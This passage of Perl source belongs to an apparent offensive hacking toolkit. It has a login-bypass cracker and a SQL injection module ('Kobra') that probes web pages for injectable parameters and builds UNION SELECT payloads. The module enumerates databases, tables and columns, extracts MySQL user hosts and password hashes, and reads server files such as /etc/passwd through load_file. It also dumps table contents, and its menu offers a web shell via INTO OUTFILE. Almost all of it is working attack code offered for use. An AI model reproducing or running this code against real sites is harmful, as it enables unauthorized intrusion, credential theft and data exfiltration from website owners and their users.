                my $code = load_nownow( $url, $code, $op, $aca, $by );
                if ( $code =~ /$st/ig ) {
                    cracked( $url, $by );
                }
            }
            adios();
        }

        if ( $op2 eq "2" ) {
            my $st = printear( "\n[+] String : ", "stdin", "11", "13" );
            printear( "\n[+] Cracking login....\n", "text", "13", "5" );
            for my $by (@bypass) {
                chomp $by;
                my $code = load_nownow( $url, $code, $op, $aca, $by );
                unless ( $code =~ /$st/ig ) {
                    cracked( $url, $by );
                }
            }
            adios();
        }

        if ( $op2 eq "3" ) {
            printear( "\n[+] Cracking login....\n", "text", "13", "5" );
            my $prueba_falsa =
              load_nownow( $url, $code, $op, $aca, "fuck you" );
            for my $by (@bypass) {
                chomp $by;
                my $code = load_nownow( $url, $code, $op, $aca, $by );
                unless ( $code eq $prueba_falsa ) {
                    cracked( $url, $by );
                }
            }
            adios();
        }
    }

    sub load_nownow {

        my ( $url, $code, $op, $aca, $text ) = @_;

        $op--;
        my @probar = ( HTML::Form->parse( $code, "/" ) )[$op];

        for my $testa (@probar) {
            if ( $testa->method eq "POST" ) {

                my @inputs = $testa->inputs;
                for my $in (@inputs) {
                    if ( $in->type eq "submit" ) {
                        if ( $in->name eq $aca ) {
                            push( @botones_names,  $in->name );
                            push( @botones_values, $in->value );
                        }
                    }
                    else {
                        push( @ordenuno, $in->name, $text );
                    }
                }

                my @preuno = @ordenuno;
                push( @preuno, $botones_names[0], $botones_values[0] );
                my $codeuno = $nave->post( $url, \@preuno )->content;

                return $codeuno;

            }
            else {

                my $final    = "";
                my $orden    = "";
                my $partedos = "";

                my @inputs = $testa->inputs;
                for my $testa (@inputs) {

                    if ( $testa->name eq $aca ) {

                        push( @botones_names,  $testa->name );
                        push( @botones_values, $testa->value );
                    }
                    else {
                        $orden .= '' . $testa->name . '=' . $text . '&';
                    }
                }
                chop($orden);

                my $partedos =
                  "&" . $botones_names[0] . "=" . $botones_values[0];
                my $final = $url . "?" . $orden . $partedos;

                $codedos = toma($final);
                return $codedos;
            }
        }
    }

    sub cracked {
        printear( "\n\a\a[+] Login Cracked\n\n", "text", "7", "5" );
        printear( "[+] URL : $_[0]\n",           "text", "7", "5" );
        printear( "[+] Bypass : $_[1]\n",        "text", "7", "5" );
        savefile( "logs-bypass.txt", "[+] URL : $_[0]" );
        savefile( "logs-bypass.txt", "[+] Bypass : $_[1]\n" );
        adios();
    }

    sub head_bypass {
        clean();
        printear( "

 @@@@        @@@@@                       @        @         @      
 @   @       @    @                      @        @                
 @   @       @    @                     @ @       @                
 @   @  @  @ @    @  @@@   @@   @@      @ @    @@@@ @@@ @@  @ @ @@ 
 @@@@   @  @ @@@@@      @ @  @ @  @    @   @  @   @ @  @  @ @ @@  @
 @   @  @  @ @       @@@@  @    @      @   @  @   @ @  @  @ @ @   @
 @   @  @  @ @      @   @   @    @     @@@@@  @   @ @  @  @ @ @   @
 @   @   @@  @      @   @ @  @ @  @   @     @ @   @ @  @  @ @ @   @
 @@@@    @   @       @@@@  @@   @@    @     @  @@@@ @  @  @ @ @   @
         @                                                         
       @@                                                          



", "logos", "7", "5" );
    }

}    ##

sub load_kobra {

    installer_kobra();
    clean();

    &head_kobra;
    &menu_kobra;

    adios();

    sub menu_kobra {
        my $page = printear( "[Page] : ", "stdin", "11", "13" );
        my $bypass =
          printear( "\n[Bypass : -- /* %20] : ", "stdin", "11", "13" );
        print "\n";
        if ( $page eq "exit" ) {
            adios();
        }
        &scan_kobra( $page, $bypass );
    }

    sub scan_kobra {
        my $page = $_[0];
        printear( "[Status] : Scanning.....\n", "text", "13", "5" );
        ( $pass1, $bypass2 ) = &bypass( $_[1] );

        my $save = partimealmedio( $_[0] );

        if ( $_[0] =~ /hackman/ig ) {
            savefilear( $save . ".txt", "\n[Target Confirmed] : $_[0]\n" );
            &menu_options( $_[0], $_[1], $save );
        }

        my $testar1 = toma( $page . $pass1 . "and" . $pass1 . "1=0" . $pass2 );
        my $testar2 = toma( $page . $pass1 . "and" . $pass1 . "1=1" . $pass2 );

        unless ( $testar1 eq $testar2 ) {
            motor( $page, $_[1] );
        }
        else {
            printear( "\n[-] Not vulnerable\n\n", "text", "5", "5" );
            my $op = printear( "[+] Scan anyway y/n : ", "stdin", "11", "13" );
            if ( $op eq "y" ) {
                motor( $page, $_[1] );
            }
            else {
                head_kobra();
                menu_kobra();
            }
        }

    }

    sub motor {

        my ( $gen, $save, $control ) = &length( $_[0], $_[1] );

        if ( $control eq 1 ) {
            printear( "[Status] : Enjoy the menu\n\n", "text", "13", "5" );
            &menu_options( $gen, $_[1], $save );
        }
        else {
            printear( "[Status] : Length columns not found\n\n",
                "text", "5", "5" );
            <STDIN>;
            &head_kobra;
            &menu_kobra;
        }
    }

    sub head_kobra {
        clean();
        printear( "
 @      @@   @             
@@     @  @ @@             
 @ @@  @  @  @ @   @ @ @@@ 
 @ @   @  @  @@ @ @@@ @  @ 
 @@    @  @  @  @  @   @@@ 
 @ @   @  @  @  @  @  @  @ 
@@@ @   @@   @@@  @@@ @@@@@




", "logos", "7", "5" );
    }

    sub length {
        printear(
            "\n[+] Looking for the number of columns\n\n", "text",
            "13",                                          "5"
        );
        my $rows = "0";
        my $asc;
        my $page = $_[0];
        ( $pass1, $pass2 ) = &bypass( $_[1] );

        $alert = "char(" . ascii("RATSXPDOWN1RATSXPDOWN") . ")";
        $total = "1";
        for my $rows ( 2 .. 200 ) {
            $asc .= "," . "char("
              . ascii( "RATSXPDOWN" . $rows . "RATSXPDOWN" ) . ")";
            $total .= "," . $rows;
            $injection =
                $page . "1" 
              . $pass1 . "and" 
              . $pass1 . "1=0" 
              . $pass1 . "union"
              . $pass1
              . "select"
              . $pass1
              . $alert
              . $asc;
            $test = toma($injection);
            if ( $test =~ /RATSXPDOWN/ ) {
                @number = $test =~ m{RATSXPDOWN(\d+)RATSXPDOWN}g;
                $control = 1;

                my $save = partimealmedio( $_[0] );

                savefilear( $save . ".txt", "\n[Target confirmed] : $page" );
                savefilear( $save . ".txt", "[Bypass] : $_[1]\n" );
                savefilear( $save . ".txt",
                    "[Limit] : The site has $rows columns" );
                savefilear( $save . ".txt",
                    "[Data] : The number @number print data" );
                $total =~ s/$number[0]/hackman/;
                savefilear(
                    $save . ".txt",
                    "[SQLI] : " 
                      . $page . "1" 
                      . $pass1 . "and" 
                      . $pass1 . "1=0"
                      . $pass1 . "union"
                      . $pass1
                      . "select"
                      . $pass1
                      . $total
                );
                return (
                    $page . "1" 
                      . $pass1 . "and" 
                      . $pass1 . "1=0" 
                      . $pass1 . "union"
                      . $pass1
                      . "select"
                      . $pass1
                      . $total,
                    $save, $control
                );
            }
        }
    }

    sub details {
        my ( $page, $bypass, $save ) = @_;
        ( $pass1, $pass2 ) = &bypass($bypass);
        savefilear( $save . ".txt", "\n" );
        if ( $page =~ /(.*)hackman(.*)/ig ) {
            printear( "[+] Searching information..\n\n", "text", "13", "5" );
            my ( $start, $end ) = ( $1, $2 );
            $inforschema =
                $start
              . "unhex(hex(concat(char(69,82,84,79,82,56,53,52))))"
              . $end
              . $pass1 . "from"
              . $pass1
              . "information_schema.tables"
              . $pass2;
            $mysqluser =
                $start
              . "unhex(hex(concat(char(69,82,84,79,82,56,53,52))))"
              . $end
              . $pass1 . "from"
              . $pass1
              . "mysql.user"
              . $pass2;
            $test3 =
              toma( $start
                  . "unhex(hex(concat(char(69,82,84,79,82,56,53,52),load_file(0x2f6574632f706173737764))))"
                  . $end
                  . $pass2 );
            $test1 = toma($inforschema);
            $test2 = toma($mysqluser);
            if ( $test2 =~ /ERTOR854/ig ) {
                savefilear( $save . ".txt", "[mysql.user] : ON" );
                printear( "[mysql.user] : ON\n", "text", "7", "5" );
            }
            else {
                printear( "[mysql.user] : OFF\n", "text", "5", "5" );
                savefilear( $save . ".txt", "[mysql.user] : OFF" );
            }
            if ( $test1 =~ /ERTOR854/ig ) {
                printear( "[information_schema.tables] : ON\n",
                    "text", "7", "5" );
                savefilear( $save . ".txt",
                    "[information_schema.tables] : ON" );
            }
            else {
                printear( "[information_schema.tables] : OFF\n",
                    "text", "5", "5" );
                savefilear( $save . ".txt",
                    "[information_schema.tables] : OFF" );
            }
            if ( $test3 =~ /ERTOR854/ig ) {
                printear( "[load_file] : ON\n", "text", "7", "5" );
                savefilear(
                    $save . ".txt",
                    "[load_file] : " 
                      . $start
                      . "unhex(hex(concat(char(69,82,84,79,82,56,53,52),load_file(0x2f6574632f706173737764))))"
                      . $end
                      . $pass2
                );
            }
            $concat =
"unhex(hex(concat(char(69,82,84,79,82,56,53,52),version(),char(69,82,84,79,82,56,53,52),database(),char(69,82,84,79,82,56,53,52),user(),char(69,82,84,79,82,56,53,52))))";
            $injection = $start . $concat . $end . $pass2;
            $code      = toma($injection);
            if ( $code =~ /ERTOR854(.*)ERTOR854(.*)ERTOR854(.*)ERTOR854/g ) {
                printear(
"\n[!] DB Version : $1\n[!] DB Name : $2\n[!] Username : $3\n\n",
                    "text", "7", "5"
                );
                savefilear(
                    $save . ".txt",
"\n[!] DB Version : $1\n[!] DB Name : $2\n[!] Username : $3\n"
                );
            }
            else {
                printear( "\n[-] Not found any data\n", "text", "5", "5" );
            }
        }
    }

    sub menu_options {

        my $testarnownow = $_[0];    ## Comment on this line to compile to exe
        $SIG{INT} =
          sub { reload($testarnownow) }; ## Comment on this line to compile to exe

        head_kobra();

        printear( "[Target confirmed] : $_[0]\n", "text", "11", "5" );
        printear( "[Bypass] : $_[1]\n\n",         "text", "11", "5" );

        my $save = partimealmedio( $_[0] );

        printear( "[save] : /logs/webs/$save\n\n", "text", "11", "5" );

        printear( "\n--== information_schema.tables ==--\n\n",
            "logos", "5", "5" );
        printear( "[1] : Show tables\n",                  "logos", "13", "5" );
        printear( "[2] : Show columns\n",                 "logos", "13", "5" );
        printear( "[3] : Show DBS\n",                     "logos", "13", "5" );
        printear( "[4] : Show tables with other DB\n",    "logos", "13", "5" );
        printear( "[5] : Show columns with other DB",     "logos", "13", "5" );
        printear( "\n\n--== mysql.user ==--\n\n",         "logos", "5",  "5" );
        printear( "[6] : Show users\n",                   "logos", "13", "5" );
        printear( "\n--== Others ==--\n\n",               "logos", "5",  "5" );
        printear( "[7] : Fuzz tables\n",                  "logos", "13", "5" );
        printear( "[8] : Fuzz Columns\n",                 "logos", "13", "5" );
        printear( "[9] : Fuzzing files with load_file\n", "logos", "13", "5" );
        printear( "[10] : Read a file with load_file\n",  "logos", "13", "5" );
        printear( "[11] : Dump\n",                        "logos", "13", "5" );
        printear( "[12] : Informacion of the server\n",   "logos", "13", "5" );
        printear( "[13] : Create a shell with into outfile\n",
            "logos", "13", "5" );
        printear( "[14] : Show Log\n",      "logos", "13", "5" );
        printear( "[15] : Change Target\n", "logos", "13", "5" );
        printear( "[16] : Exit\n",          "logos", "13", "5" );

        my $opcion = printear( "\n[Option] : ", "stdin", "11", "13" );

        if ( $opcion eq "1" ) {
            schematables( $_[0], $_[1], $save );
            &reload;
        }
        elsif ( $opcion eq "2" ) {
            my $tabla = printear( "\n[Table] : ", "stdin", "11", "13" );
            schemacolumns( $_[0], $_[1], $save, $tabla );
            &reload;
        }
        elsif ( $opcion eq "3" ) {
            &schemadb( $_[0], $_[1], $save );
            &reload;
        }
        elsif ( $opcion eq "4" ) {
            my $data = printear( "\n[Database] : ", "stdin", "11", "13" );
            &schematablesdb( $_[0], $_[1], $data, $save );
            &reload;
        }
        elsif ( $opcion eq "5" ) {
            my $db    = printear( "\n[DB] : ",    "stdin", "11", "13" );
            my $table = printear( "\n[Table] : ", "stdin", "11", "13" );
            &schemacolumnsdb( $_[0], $_[1], $db, $table, $save );
            &reload;
        }
        elsif ( $opcion eq "6" ) {
            &mysqluser( $_[0], $_[1], $save );
            &reload;
        }
        elsif ( $opcion eq "7" ) {    ##
            &fuzz( $_[0], $_[1], $save );
            &reload;
        }
        elsif ( $opcion eq "8" ) {    ##
            my $table = printear( "\n[Table] : ", "stdin", "11", "13" );
            &fuzzcol( $_[0], $_[1], $table, $save );
            &reload;
        }
        elsif ( $opcion eq "9" ) {
            &load( $_[0], $_[1], $save );
            &reload;
        }
        elsif ( $opcion eq "10" ) {
            &loadfile( $_[0], $_[1], $save );
            &reload;
        }
        elsif ( $opcion eq "11" ) {
            my $tabla = printear( "\n[Table to dump] : ", "stdin", "11", "13" );
            my $col1  = printear( "\n[Column 1] : ",      "stdin", "11", "13" );
            my $col2  = printear( "\n[Column 2] : ",      "stdin", "11", "13" );
            print "\n\n";
            &dump( $_[0], $col1, $col2, $tabla, $_[1], $save );
            &reload;
        }
        elsif ( $opcion eq "12" ) {
            print "\n";
            &details( $_[0], $_[1], $save );
            &reload;
        }
        elsif ( $opcion eq "13" ) {
            my $path =
              printear( "\n[Full Path Discloure] : ", "stdin", "11", "13" );
            &into( $_[0], $_[1], $path, $save );
            &reload;
        }
        elsif ( $opcion eq "14" ) {
            $t = "logs/webs/$save.txt";
            system_leida($t);
            &reload;
        }
        elsif ( $opcion eq "15" ) {
            &head_kobra;
            &menu_kobra;
        }

        elsif ( $opcion eq "16" ) {
            adios();
        }
        else {
            &reload;
        }
    }

    sub schematables {

        $real = "1";
        my ( $page, $bypass, $save ) = @_;
        savefilear( $save . ".txt", "\n" );

        my $page1 = $page;
        ( $pass1, $pass2 ) = &bypass( $_[1] );
        savefilear( $save . ".txt", "[DB] : Default" );
        printear( "\n[+] Searching tables with schema\n\n", "text", "13", "5" );
        $page =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),table_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $page1 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $code =
          toma( $page1 
              . $pass1 . "from" 
              . $pass1
              . "information_schema.tables"
              . $pass2 );

        if ( $code =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
            my $resto = $1;
            $total = $resto - 17;
            printear( "[+] Tables Length :  $total\n\n", "text", "13", "5" );
            savefilear( $save . ".txt", "[+] Searching tables with schema\n" );
            savefilear( $save . ".txt", "[+] Tables Length :  $total\n" );
            my $limit = $1;
            for my $limit ( 17 .. $limit ) {
                $code1 =
                  toma( $page 
                      . $pass1 . "from" 
                      . $pass1
                      . "information_schema.tables"
                      . $pass1 . "limit"
                      . $pass1
                      . $limit . ",1"
                      . $pass2 );

#print $page.$pass1."from".$pass1."information_schema.tables".$pass1."limit".$pass1.$limit.",1".$pass2."\n";
                if ( $code1 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                    my $table = $1;
                    chomp $table;
                    printear( "[Table $real Found : $table ]\n",
                        "text", "7", "5" );
                    savefilear( $save . ".txt",
                        "[Table $real Found : $table ]" );
                    $real++;
                }
            }
        }
        else {
            printear( "\n[-] information_schema = ERROR\n", "text", "5", "5" );
        }
    }

    sub reload {
        printear( "\n[+] Press the enter key to return to main menu\n",
            "text", "11", "5" );
        <STDIN>;
        &head_kobra;
        &menu_options;
    }

    sub schemacolumns {
        my ( $page, $bypass, $save, $table ) = @_;
        my $page3 = $page;
        my $page4 = $page;
        savefilear( $save . ".txt", "\n" );
        ( $pass1, $pass2 ) = &bypass($bypass);
        printear( "\n[DB] : Default\n", "text", "13", "5" );
        savefilear( $save . ".txt", "[DB] : Default" );
        savefilear( $save . ".txt", "[Table] : $table\n" );
        $page3 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $code3 =
          toma( $page3 
              . $pass1 . "from" 
              . $pass1
              . "information_schema.columns"
              . $pass1 . "where"
              . $pass1
              . "table_name=char("
              . ascii($table) . ")"
              . $pass2 );

        if ( $code3 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
            printear( "\n[Columns Length : $1 ]\n\n", "text", "13", "5" );
            savefilear( $save . ".txt", "[Columns Length : $1 ]\n" );
            my $si = $1;
            chomp $si;
            $page4 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),column_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
            $real = "1";
            for my $limit2 ( 0 .. $si ) {
                $code4 =
                  toma( $page4 
                      . $pass1 . "from" 
                      . $pass1
                      . "information_schema.columns"
                      . $pass1 . "where"
                      . $pass1
                      . "table_name=char("
                      . ascii($table) . ")"
                      . $pass1 . "limit"
                      . $pass1
                      . $limit2 . ",1"
                      . $pass2 );
                if ( $code4 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                    printear( "[Column $real] : $1\n", "text", "7", "5" );
                    savefilear( $save . ".txt", "[Column $real] : $1" );
                    $real++;
                }
            }
        }
        else {
            printear( "\n[-] information_schema = ERROR\n", "text", "5", "5" );
        }
    }

    sub schemadb {
        my ( $page, $bypass, $save ) = @_;
        my $page1 = $page;
        savefilear( $save . ".txt", "\n" );
        printear( "\n[+] Searching DBS\n\n", "text", "13", "5" );
        ( $pass1, $pass2 ) = &bypass($bypass);
        $page =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $code = toma(
            $page . $pass1 . "from" . $pass1 . "information_schema.schemata" );
        if ( $code =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
            my $limita = $1;
            printear( "[+] Databases Length : $limita\n\n", "text", "13", "5" );
            savefilear( $save . ".txt", "[+] Databases Length : $limita\n" );
            $page1 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),schema_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
            $real = "1";
            for my $limit ( 0 .. $limita ) {
                $code =
                  toma( $page1 
                      . $pass1 . "from" 
                      . $pass1
                      . "information_schema.schemata"
                      . $pass1 . "limit"
                      . $pass1
                      . $limit . ",1"
                      . $pass2 );
                if ( $code =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                    my $control = $1;
                    if (    $control ne "information_schema"
                        and $control ne "mysql"
                        and $control ne "phpmyadmin" )
                    {
                        printear(
                            "[Database $real Found] $control\n", "text",
                            "7",                                 "5"
                        );
                        savefilear( $save . ".txt",
                            "[Database $real Found] : $control" );
                        $real++;
                    }
                }
            }
        }
        else {
            printear( "\n[-] information_schema = ERROR\n", "text", "5", "5" );
        }
    }

    sub schematablesdb {
        my $page  = $_[0];
        my $db    = $_[2];
        my $page1 = $page;
        savefilear( $_[3] . ".txt", "\n" );
        printear( "\n[+] Searching tables in DB [$db]\n\n", "text", "13", "5" );
        ( $pass1, $pass2 ) = &bypass( $_[1] );
        savefilear( $_[3] . ".txt", "[DB] : $db" );
        $page =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),table_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $page1 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $code =
          toma( $page1 
              . $pass1 . "from" 
              . $pass1
              . "information_schema.tables"
              . $pass1 . "where"
              . $pass1
              . "table_schema=char("
              . ascii($db) . ")"
              . $pass2 );

#print $page.$pass1."from".$pass1."information_schema.tables".$pass1."where".$pass1."table_schema=char(".ascii($db).")".$pass2."\n";
        if ( $code =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
            printear( "[+] Tables Length :  $1\n\n", "text", "13", "5" );
            savefilear( $_[3] . ".txt", "[+] Tables Length :  $1\n" );
            my $limit = $1;
            $real = "1";
            for my $lim ( 0 .. $limit ) {
                $code1 =
                  toma( $page 
                      . $pass1 . "from" 
                      . $pass1
                      . "information_schema.tables"
                      . $pass1 . "where"
                      . $pass1
                      . "table_schema=char("
                      . ascii($db) . ")"
                      . $pass1 . "limit"
                      . $pass1
                      . $lim . ",1"
                      . $pass2 );

#print $page.$pass1."from".$pass1."information_schema.tables".$pass1."where".$pass1."table_schema=char(".ascii($db).")".$pass1."limit".$pass1.$lim.",1".$pass2."\n";
                if ( $code1 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                    my $table = $1;
                    chomp $table;
                    savefilear( $_[3] . ".txt",
                        "[Table $real Found : $table ]" );
                    printear( "[Table $real Found : $table ]\n",
                        "text", "7", "5" );
                    $real++;
                }
            }
        }
        else {
            printear( "\n[-] information_schema = ERROR\n", "text", "5", "5" );
        }
    }

    sub schemacolumnsdb {
        my ( $page, $bypass, $db, $table, $save ) = @_;
        my $page3 = $page;
        my $page4 = $page;
        printear( "\n[+] Searching columns in table $table in DB [$db]\n",
            "text", "13", "5" );
        savefilear( $save . ".txt", "\n" );
        ( $pass1, $pass2 ) = &bypass( $_[1] );
        savefilear( $save . ".txt", "\n[DB] : $db" );
        savefilear( $save . ".txt", "[Table] : $table" );
        $page3 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
        $code3 =
          toma( $page3 
              . $pass1 . "from" 
              . $pass1
              . "information_schema.columns"
              . $pass1 . "where"
              . $pass1
              . "table_name=char("
              . ascii($table) . ")"
              . $pass1 . "and"
              . $pass1
              . "table_schema=char("
              . ascii($db) . ")"
              . $pass2 );

        if ( $code3 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
            printear( "\n[Columns length : $1 ]\n\n", "text", "13", "5" );
            savefilear( $save . ".txt", "[Columns length : $1 ]\n" );
            my $si = $1;
            chomp $si;
            $page4 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),column_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
            $real = "1";
            for my $limit2 ( 0 .. $si ) {
                $code4 =
                  toma( $page4 
                      . $pass1 . "from" 
                      . $pass1
                      . "information_schema.columns"
                      . $pass1 . "where"
                      . $pass1
                      . "table_name=char("
                      . ascii($table) . ")"
                      . $pass1 . "and"
                      . $pass1
                      . "table_schema=char("
                      . ascii($db) . ")"
                      . $pass1 . "limit"
                      . $pass1
                      . $limit2 . ",1"
                      . $pass2 );
                if ( $code4 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                    printear( "[Column $real] : $1\n", "text", "7", "5" );
                    savefilear( $save . ".txt", "[Column $real] : $1" );
                    $real++;
                }
            }
        }
        else {
            printear( "\n[-] information_schema = ERROR\n", "text", "5", "5" );
        }
    }

    sub mysqluser {
        my ( $page, $bypass, $save ) = @_;
        my $cop  = $page;
        my $cop1 = $page;
        savefilear( $save . ".txt", "\n" );
        printear( "\n[+] Finding mysql.users\n", "text", "13", "5" );
        ( $pass1, $pass2 ) = &bypass($bypass);
        $page =~ s/hackman/concat(char(82,65,84,83,88,80,68,79,87,78,49))/;
        $code =
          toma( $page . $pass1 . "from" . $pass1 . "mysql.user" . $pass2 );

        if ( $code =~ /RATSXPDOWN/ig ) {
            $cop1 =~
s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
            $code1 =
              toma( $cop1 . $pass1 . "from" . $pass1 . "mysql.user" . $pass2 );
            if ( $code1 =~ /RATSXPDOWN1(.*)RATSXPDOWN1/ig ) {
                printear( "\n[+] Users Found : $1\n\n", "text", "13", "5" );
                savefilear( $save . ".txt", "\n[+] Users mysql Found : $1\n" );
                for my $limit ( 0 .. $1 ) {
                    $cop =~
s/hackman/unhex(hex(concat(0x524154535850444f574e,Host,0x524154535850444f574e,User,0x524154535850444f574e,Password,0x524154535850444f574e)))/;
                    $code =
                      toma( $cop 
                          . $pass1 . "from" 
                          . $pass1
                          . "mysql.user"
                          . $pass1 . "limit"
                          . $pass1
                          . $limit . ",1"
                          . $pass2 );
                    if ( $code =~
                        /RATSXPDOWN(.*)RATSXPDOWN(.*)RATSXPDOWN(.*)RATSXPDOWN/ig
                      )
                    {
                        printear( "[Host] : $1 [User] : $2 [Password] : $3\n",
                            "text", "7", "5" );
                        savefilear( $save . ".txt",
                            "[Host] : $1 [User] : $2 [Password] : $3" );
                    }
                    else {
                        &reload;
                    }
                }
            }
        }
        else {
            printear( "\n[-] mysql.user = ERROR\n", "text", "5", "5" );
        }
    }

    sub fuzz {
        my $page = $_[0];
        ( $pass1, $pass2 ) = &bypass( $_[1] );
        my $count = "0";
        savefilear( $_[2] . ".txt", "\n" );
        print "\n";
        if ( $_[0] =~ /(.*)hackman(.*)/g ) {
            my $start = $1;
            my $end   = $2;
            printear( "[+] Searching tables.....\n\n", "text", "13", "5" );
            for my $table (@buscar2) {
                chomp $table;
                $concat = "unhex(hex(concat(char(69,82,84,79,82,56,53,52))))";
                $injection =
                    $start 
                  . $concat 
                  . $end 
                  . $pass1 . "from" 
                  . $pass1 
                  . $table
                  . $pass2;
                $code = toma($injection);
                if ( $code =~ /ERTOR854/g ) {
                    $count++;
                    printear( "[Table Found] : $table\n", "text", "7", "5" );
                    savefilear( $_[2] . ".txt", "[Table Found] : $table" );
                }
            }
        }
        if ( $count eq "0" ) {
            printear( "[-] Not found any table\n", "text", "5", "5" );
            &reload;
        }
    }

    sub fuzzcol {
        my $page = $_[0];
        ( $pass1, $pass2 ) = &bypass( $_[1] );
        my $count = "0";
        savefilear( $_[3] . ".txt", "\n" );
        print "\n";
        if ( $_[0] =~ /(.*)hackman(.*)/ ) {
            my $start = $1;
            my $end   = $2;
            printear(
                "[+] Searching columns for the table ["
                  . $_[2] . "]"
                  . " ....\n\n",
                "text", "13", "5"
            );
            savefilear( $_[3] . ".txt", "[Table] : $_[2]" );
            for my $columns (@buscar1) {
                chomp $columns;
                $concat =
"unhex(hex(concat(char(69,82,84,79,82,56,53,52),$columns,char(69,82,84,79,82,56,53,52))))";
                $code =
                  toma( $start 
                      . $concat 
                      . $end 
                      . $pass1 . "from" 
                      . $pass1
                      . $_[2]
                      . $pass2 );
                if ( $code =~ /ERTOR854/g ) {
                    $count++;
                    printear( "[Column Found] : $columns\n", "text", "7", "5" );
                    savefilear( $_[3] . ".txt", "[Column Found] : $columns" );
                }
            }
        }
        if ( $count eq "0" ) {
            printear( "[-] Not found any column\n", "text", "5", "5" );
            &reload;
        }
    }

    sub load {
        savefilear( $_[2] . ".txt", "\n" );
        print "\n";
        ( $pass1, $pass2 ) = &bypass( $_[1] );
        if ( $_[0] =~ /(.*)hackman(.*)/g ) {
            printear(
                "[+] Searching files with load_file...\n\n", "text",
                "13",                                        "5"
            );
            my $start = $1;
            my $end   = $2;
            for my $file (@files) {
                chomp $file;
                $concat =
                    "unhex(hex(concat(char(107,48,98,114,97),load_file("
                  . encode($file)
                  . "),char(107,48,98,114,97))))";
                my $code = toma( $start . $concat . $end . $pass2 );
                chomp $code;
                if ( $code =~ /k0bra(.*)k0bra/s ) {
                    printear( "[File Found] : $file\n", "text", "11", "5" );
                    printear( "\n[Source Start]\n\n",   "text", "7",  "5" );
                    printear( "$1",                     "text", "7",  "5" );
                    printear( "\n\n[Source End]\n\n",   "text", "7",  "5" );
                    savefilear( $_[2] . ".txt", "[File Found] : $file" );
                    savefilear( $_[2] . ".txt", "\n[Source Start]\n" );
                    savefilear( $_[2] . ".txt", "$1" );
                    savefilear( $_[2] . ".txt", "\n[Source End]\n" );
                }
            }
        }
    }

    sub loadfile {
        savefilear( $_[2] . ".txt", "\n" );
        ( $pass1, $pass2 ) = &bypass( $_[1] );
        if ( $_[0] =~ /(.*)hackman(.*)/g ) {
            my $start = $1;
            my $end   = $2;
            my $file = printear( "\n[+] File to read : ", "stdin", "11", "13" );
            $concat =
                "unhex(hex(concat(char(107,48,98,114,97),load_file("
              . encode($file)
              . "),char(107,48,98,114,97))))";
            my $code = toma( $start . $concat . $end . $pass2 );
            chomp $code;
            if ( $code =~ /k0bra(.*)k0bra/s ) {
                printear( "\n[File Found] : $file\n", "text", "11", "5" );
                printear( "\n[Source Start]\n\n",     "text", "7",  "5" );
                printear( "$1",                       "text", "7",  "5" );
                printear( "\n\n[Source End]\n\n",     "text", "7",  "5" );
                savefilear( $_[2] . ".txt", "[File Found] : $file" );
                savefilear( $_[2] . ".txt", "\n[Source Start]\n" );
                savefilear( $_[2] . ".txt", "$1" );
                savefilear( $_[2] . ".txt", "\n[Source End]\n" );
            }
        }
    }

    sub dump {
        savefilear( $_[5] . ".txt", "\n" );
        my $page = $_[0];
        ( $pass1, $pass2 ) = &bypass( $_[4] );
        if ( $page =~ /(.*)hackman(.*)/ ) {
            my $start = $1;
            my $end   = $2;
            printear( "[+] Extracting values...\n", "text", "13", "5" );
            $concatx =
"unhex(hex(concat(char(69,82,84,79,82,56,53,52),count($_[1]),char(69,82,84,79,82,56,53,52))))";
            $val_code =
              toma( $start 
                  . $concatx 
                  . $end 
                  . $pass1 . "from" 
                  . $pass1
                  . $_[3]
                  . $pass2 );
            $concat =
"unhex(hex(concat(char(69,82,84,79,82,56,53,52),$_[1],char(69,82,84,79,82,56,53,52),$_[2],char(69,82,84,79,82,56,53,52))))";
            if ( $val_code =~ /ERTOR854(.*)ERTOR854/ig ) {
                $tota = $1;
                printear(
                    "\n[+] Length of the rows : $tota\n\n", "text",
                    "13",                                   "5"
                );
                printear( "[+] Extracting values...\n\n", "text", "13", "5" );
                printear( "[$_[1]] [$_[2]]\n\n",          "text", "13", "5" );
                savefilear( $_[5] . ".txt", "[Table] : $_[3]" );
                savefilear( $_[5] . ".txt", "[+] Length of the rows: $tota\n" );
                savefilear( $_[5] . ".txt", "[$_[1]] [$_[2]]\n" );
                for my $limit ( 0 .. $tota ) {
                    chomp $limit;
                    $injection =
                      toma( $start 
                          . $concat 
                          . $end 
                          . $pass1 . "from" 
                          . $pass1
